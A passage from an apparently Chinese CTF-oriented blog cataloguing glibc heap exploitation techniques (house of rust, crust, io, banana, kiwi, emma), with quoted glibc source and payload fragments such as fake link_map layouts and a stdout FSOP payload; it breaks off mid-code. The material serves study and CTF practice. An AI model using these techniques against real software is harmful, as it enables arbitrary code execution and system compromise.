title="利用效果"></a>利用效果</h3><ul><li>构造出<strong>堆重叠</strong>，为后续利用做准备</li></ul><h2 id="house-of-rust"><a href="#house-of-rust" class="headerlink" title="house of rust"></a>house of rust</h2><h3 id="漏洞成因-13"><a href="#漏洞成因-13" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-13"><a href="#适用范围-13" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>——至今</li><li>可以进行<code>tcache stash unlinking</code>攻击</li><li>可以进行<code>largebin attack</code></li><li>不需要泄露地址</li></ul><h3 id="利用原理-13"><a href="#利用原理-13" class="headerlink" title="利用原理"></a>利用原理</h3><p><strong>前置知识</strong></p><p>首先需要知道<code>tcachebin stash unlinking</code>，下面称之为<code>TSU</code>技巧：</p><ul><li><code>tcachebin[A]</code>为空</li><li><code>smallbin[A]</code>有<code>8</code>个</li><li>修改第<code>8</code>个<code>smallbin chunk</code>的<code>bk</code>为<code>addr</code></li><li>分配<code>malloc(A)</code>的时候，<code>addr+0x10</code>会被写一个<code>libc</code>地址</li></ul><p>还要知道<code>tcachebin stash unlinking+</code>，下面称之为<code>TSU+</code>技巧：</p><ul><li><code>tcachebin[A]</code>为空</li><li><code>smallbin[A]</code>有<code>8</code>个</li><li>修改第<code>7</code>个<code>smallbin chunk</code>的<code>bk</code>为<code>addr</code>，还要保证<code>*(addr+0x18)</code>是一个合法可写的地址</li><li>分配<code>malloc(A)</code>的时候，<code>addr</code>会被链入到<code>tcachebin</code>，也就是可以分配到<code>addr</code>处</li></ul><p><strong>第一阶段：堆风水布局（Heap Feng Shui）</strong></p><ul><li>首先先分配14个0x90的chunk(编号1-14)，然后再接替释放到tcache和smallbin中（1\3\5\7\9\11\13释放到tcahce….）</li><li>之后通过分配大chunk将unsortedbin中的都放入smallbin</li></ul><p><strong>第二阶段：Tcache Stashing Unlink+ 结合 Largebin 攻击</strong></p><ul><li>然后通过WAF修改chunk14的size片段为0xB0，之后再次释放chunk14到tcahce[0xB0]中，此时他的bk就是tcahce_key，也就是<code>&amp;tcahce_perthread_struct+0x10</code>，但是同时也造成了smallbin链的破坏</li><li>再次修改chunk14的bk的最低字节为0x80，指向<code>tcache_perthread_struct + 0x80 - 0x18</code>（0x30 tcache头部附近）</li><li>之后通过largebin attack修改chunk14的fd以修复smallbin链</li><li>清空tcahe然后再次分配0x90块，触发Tcache Stashing Unlink+机制，使得0x90 tcache头部指向<code>tcache_perthread_struct + 0x80</code></li></ul><p><strong>第三阶段：Tcache Stashing Unlink 结合二次Largebin攻击</strong></p><ul><li>分配15个0xa0的块</li><li>通过将<code>Tcache Stashing Unlink</code>将libc地址写入<code>tcache_perthread_struct</code></li></ul><p><strong>第四阶段：stdout FSOP泄露libc</strong></p><ul><li>利用第三阶段写入的libc地址，部分写，多次爆破，即可将chunk分配到<code>_IO_2_1_stdout_</code>结构</li><li>之后通过结构体复写即可触发libc泄露，泄露完就简单多了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line">payload=p64(_flags)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>第五阶段：最终Shell获取</strong></p><ul><li><code>__free_hook</code>写system或者onegadget都是可以的</li></ul><p>上面的过程最好的情况下需要爆破<code>1/16</code>，最差<code>1/256</code>。</p><p><strong>但是</strong>，<code>2.34</code>之后，<code>tcache_key</code>是一个随机数，不是<code>tcache_perthread_struct + 0x10</code>了。</p><p>所以，此时可以加上<code>largebin attack</code>，把以上的第二步变为：继续用<code>largebin attack</code>向其<code>bk</code>写一个堆地址，然后还要部分写<code>bk</code>使其落在<code>tcache_perthread_struct</code>区域。其他步骤一样。</p><p>或者，在<code>smallbin</code>里面放<code>9</code>个，这样第<code>8</code>个的<code>bk</code>肯定就是一个堆地址。此时就需要爆破<code>1/16</code>的堆，<code>1/16</code>的<code>glibc</code>地址，成功的概率是<code>1/256</code>。</p><h3 id="相关技巧-13"><a href="#相关技巧-13" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>总的来说，就是利用<code>tcachebin stash unlinking</code>打<code>tcache_perthread_struct</code></li><li>利用<code>largebin attack</code>构造合法地址</li></ul><h3 id="利用效果-13"><a href="#利用效果-13" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意函数执行</li></ul><h2 id="house-of-crust"><a href="#house-of-crust" class="headerlink" title="house of crust"></a>house of crust</h2><h3 id="漏洞成因-14"><a href="#漏洞成因-14" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-14"><a href="#适用范围-14" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>——<code>2.37</code></li><li>可以进行<code>tcache stash unlinking</code>攻击</li><li>可以进行<code>largebin attack</code></li><li>不需要泄露地址</li></ul><h3 id="利用原理-14"><a href="#利用原理-14" class="headerlink" title="利用原理"></a>利用原理</h3><p>其他步骤和上面的<code>house of rust</code>一样，但是到第五步的时候，去修改<code>global_max_fast</code></p><p>后面的步骤和<code>house of corrosion</code>是一样的，通过写原语打<code>stderr</code>修改<code>one_gadget</code>拿到<code>shell</code>。</p><h3 id="相关技巧-14"><a href="#相关技巧-14" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li><code>house of crust = house of corrosion + house of rust</code></li><li><code>2.37</code>之后，<code>house of corrosion</code>使用受限</li></ul><h2 id="house-of-io"><a href="#house-of-io" class="headerlink" title="house of io"></a>house of io</h2><h3 id="漏洞成因-15"><a href="#漏洞成因-15" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-15"><a href="#适用范围-15" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>—— 至今</li></ul><h3 id="利用原理-15"><a href="#利用原理-15" class="headerlink" title="利用原理"></a>利用原理</h3><p>其他博客上对该方法的介绍如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The tcache_perthread_object is allocated when the heap is created. Furthermore, it is stored right at the heap&#x27;s beginning (at a relatively low memory address). The safe-linking mitigation aims to protect the fd/next pointer within the free lists. However, the head of each free-list is not protected. Additionally, freeing a chunk and placing it into the tcachebin also places a non-protected pointer to the appropriate tcache entry in the 2nd qword of a chunks&#x27; user data. The House of IO assumes one of three scenarios for the bypass to work. First, any attacker with a controlled linear buffer underflow over a heap buffer, or a relative arbitrary write will be able to corrupt the tcache. Secondly, a UAF bug allowing to read from a freed tcache eligible chunk leaks the tcache and with that, the heap base. Thirdly, a badly ordered set of calls to free(), ultimately passing the address of the tcache itself to free, would link the tcache into the 0x290 sized tcachebin. Allocating it as a new chunk would mean complete control over the tcache&#x27;s values.</span><br></pre></td></tr></table></figure><p>可以看出来，其实就是对 <code>tcache_perthread_struct</code> 结构体的攻击，想办法将其释放掉，然后再申请回来，申请回来的时候就能控制整个 <code>tcache</code> 的分配。</p><h3 id="相关技巧-15"><a href="#相关技巧-15" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>围绕 <code>tcache_perthread_struct</code> 进行攻击</li></ul><h3 id="利用效果-14"><a href="#利用效果-14" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li></ul><h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><h3 id="漏洞成因-16"><a href="#漏洞成因-16" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-16"><a href="#适用范围-16" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以进行 <code>largebin attack</code></li><li>能执行 <code>exit</code> 函数</li></ul><h3 id="利用原理-16"><a href="#利用原理-16" class="headerlink" title="利用原理"></a>利用原理</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">        l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">            || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">                                  &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                                  <span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),</span><br><span class="line">                                  ns);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">            <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">                    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">                                    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                                  / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">                <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                    ((<span class="type">fini_t</span>) array[i]) ();  <span class="comment">//调用函数</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">            <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="built_in">DL_CALL_DT_FINI</span></span><br><span class="line">                (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">        _dl_audit_objclose (l);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">    --l-&gt;l_direct_opencount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">                    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<span class="comment">//DT_FINI_ARRAY=26 d_un.d_ptr偏移为8</span></span><br></pre></td></tr></table></figure><p>也就是我们将<code>l-&gt;l_info[26]</code>写入<code>l_info[26]</code>的地址，<code>array</code>的值就是<code>l_info[27]</code>中存放的值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                  / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr))); <span class="comment">//DT_FINI_ARRAYSZ=28，还是偏移8</span></span><br></pre></td></tr></table></figure><p>也就是说我们在<code>l_info[28]</code>写入<code>l_info[28]</code>的地址，<code>i</code>的值就是<code>l_info[29]中存放的值/8</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="type">fini_t</span>) array[i]) ();  <span class="comment">//调用函数</span></span><br></pre></td></tr></table></figure><p>最后会执行<code>array[i]-&gt;array[0]</code>，从i到0调用</p><p><strong>2.31打orw：</strong></p><ul><li><p>通过largebin attack伪造<code>_rtld_global</code>的<code>link_map</code>地址</p></li><li><p>然后布局link_map打orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">link_map=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x223740</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">0x20</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)</span><br><span class="line">link_map+=p64(setcontext)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsi</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">link_map+=p64(<span class="number">0x100</span>)<span class="comment">#rdx</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>2.27打onegadget：</strong></p><ul><li><p>link_map：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">link_map=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">1</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(libc_base+<span class="number">0x61c710</span>)#l_next</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xb90</span>)#l_real</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">8</span>)#<span class="comment">//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(one_gadget)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xb90</span>)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">58</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0x800000000</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="相关技巧-16"><a href="#相关技巧-16" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>伪造 <code>fini_array</code> 数组的时候，是从后往前遍历的</li><li>有时候远程的 <code>rtld_global</code> 的偏移与本地不一样，需要爆破</li><li>如果不想逐个伪造，可以直接用 <code>gdb</code> 从内存里面 <code>dump</code> 出来，然后基于偏移修改内存即可</li></ul><h3 id="利用效果-15"><a href="#利用效果-15" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意代码执行</li></ul><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><h3 id="漏洞成因-17"><a href="#漏洞成因-17" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-17"><a href="#适用范围-17" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.36</code></li><li>在 <code>malloc</code> 流程中触发 <code>assert</code></li></ul><h3 id="利用原理-17"><a href="#利用原理-17" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要是提供了一种在程序中调用 <code>IO</code> 流函数的思路：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> IS_IN (libc)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NDEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)\</span></span><br><span class="line"><span class="meta"> __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>可以看到，调用到了 <code>fxprintf</code> 和 <code>fflush(stderr)</code>。对stderr进行劫持</p><p>在<code>_int_malloc</code>中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这个对top进行了assert判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">old_size &gt;= <span class="number">0x20</span>;</span><br><span class="line">old_top.prev_inuse = <span class="number">0</span>;</span><br><span class="line">old_top页对齐</span><br></pre></td></tr></table></figure><p>因此只要堆溢出改个size就可以触发assert了</p><p>在<code>__fxprintf</code>函数中调用的是偏移0x38的指针</p><p>在<code>fflush</code>函数中调用到了一个指针:位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且观察发现RDX寄存器的值为<code>IO_helper_jumps</code>指针</p><p>因此有以下的利用：</p><ul><li>通过largebin attack劫持stderr指针</li><li>通过堆溢出或其他手法触发assert</li><li>修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code></li><li>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移(感觉条件要求好多，但是对于assert触发的IO可以利用)</li></ul><h3 id="利用效果-16"><a href="#利用效果-16" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>触发 <code>IO</code> 处理流程，为后续利用做准备</li></ul><h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><h3 id="漏洞成因-18"><a href="#漏洞成因-18" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-18"><a href="#适用范围-18" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以进行两次 <code>largebin attack</code></li><li>或者可以进行两次任意地址写堆地址</li><li>可以触发 <code>IO</code> 流操作</li></ul><h3 id="利用原理-18"><a href="#利用原理-18" class="headerlink" title="利用原理"></a>利用原理</h3><p>在vtable的合法范围之内，存在<code>_IO_cookie_jumps</code>，可以通过偏移来调用vtable表里的所有函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_cookie_jumps libio_vtable = &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_file_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, _IO_file_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, _IO_file_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_file_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_file_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_file_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_file_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_cookie_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_cookie_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_cookie_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_cookie_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span 